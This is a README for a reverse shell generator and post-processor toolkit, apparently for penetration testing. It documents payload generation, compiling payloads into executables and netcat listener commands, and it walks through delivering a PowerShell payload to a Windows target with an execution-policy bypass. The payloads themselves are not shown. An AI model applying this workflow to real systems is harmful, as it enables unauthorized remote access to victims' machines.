# DeepTruth – Reverse Shell Toolkit (Private Repository)

## 📁 Repository Contents

This repository contains two complementary tools for authorized penetration testing and red team exercises:

| File | Description |
|------|-------------|
| `revgen.py` | **Ultimate Reverse Shell Generator** – 50+ payloads for Linux, macOS, Windows, Android, BSD. Auto‑detects OS, supports IPv4/IPv6, batch generation, multiple output formats (txt, json, md). |
| `post_revgen.sh` | **Post‑processor & Compiler** – Extracts IP/port from any payload, compiles Python payloads into standalone executables (PyInstaller), auto‑detects listener type, copies listener command to clipboard, and can start the listener in a new terminal. |

---

## 🚀 Quick Start

```bash
# Clone the repository (private)
git clone https://github.com/your-org/deeptruth-revshell.git
cd deeptruth-revshell

# Make scripts executable
chmod +x revgen.py post_revgen.sh

# Generate payloads (interactive)
python3 revgen.py -i 10.0.0.5 -p 4444

# Process a payload file (compile + listener)
./post_revgen.sh payloads.txt
```

---

## ⚙️ Prerequisites

### System Requirements
- **Python 3.8+** (for `revgen.py`)
- **Bash 4+** (for `post_revgen.sh`)
- **Optional but recommended:**
  - `pyinstaller` – for compiling Python payloads into standalone executables
  - `jq` – for parsing JSON output files
  - `xclip` (Linux) / `pbcopy` (macOS) / `clip.exe` (Windows) – clipboard integration
  - Terminal emulators: `xterm`, `gnome-terminal`, or `Terminal.app` for automatic listener startup

### Install Dependencies

```bash
# Python dependencies (minimal, no extra packages required)
pip install pyperclip   # optional, for clipboard support

# For compilation (Linux/macOS)
pip install pyinstaller

# For JSON parsing (if you use --format json)
sudo apt install jq          # Debian/Ubuntu
brew install jq              # macOS
```

---

## 📖 revgen.py – Reverse Shell Generator

### 🔧 Command Line Arguments

| Argument | Description | Example |
|----------|-------------|---------|
| `-i, --ip` | Listener IP address (IPv4 or IPv6) | `-i 10.0.0.5` |
| `-p, --port` | Listener port (default: 4444) | `-p 8080` |
| `-s, --shell` | Shell to spawn (default: /bin/sh) | `-s /bin/bash` |
| `--os` | Override OS detection (linux, macos, windows, android, bsd) | `--os windows` |
| `--listener` | Start listener automatically after selection | `--listener` |
| `--listener-type` | Type of listener to generate (netcat, socat, ncat, python, powershell) | `--listener-type socat` |
| `--ipv6` | Use IPv6 syntax (adds brackets) | `--ipv6` |
| `--batch` | Batch mode: file with one IP per line | `--batch targets.txt` |
| `--output` | Output directory for batch generation | `--output ./payloads/` |
| `--save-listener` | Save listener command to a shell script | `--save-listener` |
| `--format` | Output format: txt, json, md (default: txt) | `--format json` |
| `--no-color` | Disable colored output | `--no-color` |

### 📝 Usage Examples

#### 1. Interactive single IP (most common)
```bash
python3 revgen.py -i 192.168.1.100 -p 4444
```
- Prompts you to select a payload number.
- Displays the command.
- Optionally copies to clipboard, saves to file, or starts a listener.

#### 2. Non‑interactive (pipe to file)
```bash
python3 revgen.py -i 10.0.0.5 -p 9001 --os linux > payloads.txt
```
- Outputs all payloads (one per line) suitable for scripting.

#### 3. Batch generation for multiple IPs
```bash
echo "10.0.0.1
10.0.0.2
10.0.0.3" > targets.txt
python3 revgen.py --batch targets.txt -p 5555 --output ./my_payloads/ --format json
```
- Creates one file per IP in `./my_payloads/` in JSON format.

#### 4. IPv6 with automatic listener start
```bash
python3 revgen.py -i "fe80::1" -p 9999 --ipv6 --listener --listener-type ncat
```

#### 5. Save listener script for later use
```bash
python3 revgen.py -i 172.16.0.10 -p 1234 --save-listener
# Creates listener_1234.sh
```

### 📂 Output File Formats

| Format | Structure | Use Case |
|--------|-----------|----------|
| `txt` | Plain text: `1: Payload name`<br>`command` | Human readable, easy to copy |
| `json` | `[{"name": "...", "command": "..."}]` | Programmatic parsing, integration with other tools |
| `md` | Markdown with code blocks | Documentation, reports |

---

## 🛠️ post_revgen.sh – Post‑Processor & Compiler

### 🔧 Command Line Arguments

| Argument | Description |
|----------|-------------|
| `[file]` | Path to a payload file (txt, json, or md) – optional |
| `--compile` | Automatically compile any Python payload without asking |
| `--listener-only` | Only generate a listener (no payload file needed) |

### 📝 Usage Examples

#### 1. Process a payload file (interactive)
```bash
./post_revgen.sh payloads.txt
```
- Shows preview of available payloads.
- Let you select line number(s), all, or manual paste.
- Extracts IP/port, offers compilation (if Python), prints listener command, copies to clipboard, optionally starts listener.

#### 2. Compile without prompting
```bash
./post_revgen.sh payloads.txt --compile
```
- Automatically extracts Python code and runs PyInstaller.

#### 3. Manual paste (no file)
```bash
./post_revgen.sh
# then paste your payload command (Ctrl+D to finish)
```

#### 4. Just start a listener
```bash
./post_revgen.sh --listener-only
# Enter port and listener type
```

### 🧠 Smart Features

- **Auto‑detects IP/port** from any payload (IPv4, IPv6 with/without brackets).
- **Recognises payload language** (Python, PowerShell, bash, netcat, socat, etc.).
- **Generates appropriate listener** (netcat, socat, ncat, python, powershell).
- **Copies listener command** to clipboard (pbcopy, xclip, clip.exe).
- **Compiles Python one‑liners** into standalone executables with PyInstaller.
- **Handles multiple payloads** from a file (line ranges, comma‑separated, or all).
- **Cross‑platform terminal startup** – macOS Terminal, Linux (xterm/gnome‑terminal), Windows Command Prompt.

---

## 🔄 Full Workflow Example

### Step 1: Generate payloads on your attacker machine
```bash
python3 revgen.py -i 10.0.0.5 -p 4444 --os windows > win_payloads.txt
```
Select a PowerShell or `nc.exe` payload (e.g., number 44 or 45).  
Save the command.

### Step 2: Process the payload
```bash
./post_revgen.sh win_payloads.txt --compile
```
- Choose the line number of your selected payload.
- Confirm IP/port.
- The script will extract the PowerShell code and save it as `payload.ps1` (or compile if Python).
- Listener command `nc -lvnp 4444` is printed and copied.

### Step 3: Start listener (automatic or manual)
```bash
nc -lvnp 4444
```

### Step 4: Execute on target
- Copy `payload.ps1` (or the compiled executable) to the Windows target.
- Run it (e.g., `powershell -ExecutionPolicy Bypass -File payload.ps1`).

### Step 5: Enjoy reverse shell

---

## ⚠️ Ethical & Legal Disclaimer

> **IMPORTANT**: This tool is intended **exclusively** for authorized security testing, penetration testing engagements with written permission, and educational purposes on systems you own or have explicit permission to test.  
> Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.  
> Always comply with local laws and obtain proper authorization before using this toolkit.

---

## 📜 License

Private repository – all rights reserved.  
Do not redistribute without explicit permission.

---

## 🤝 Contributing

Issues and pull requests are welcome only from authorized team members.  
For security concerns, contact the repository maintainer directly.

---

## 📞 Support

For internal team support, refer to the documentation or contact the security team via internal channels.

---

**Version:** 2.0  
**Last Updated:** 2025-06-15  
**Maintainer:** Security Architecture Team
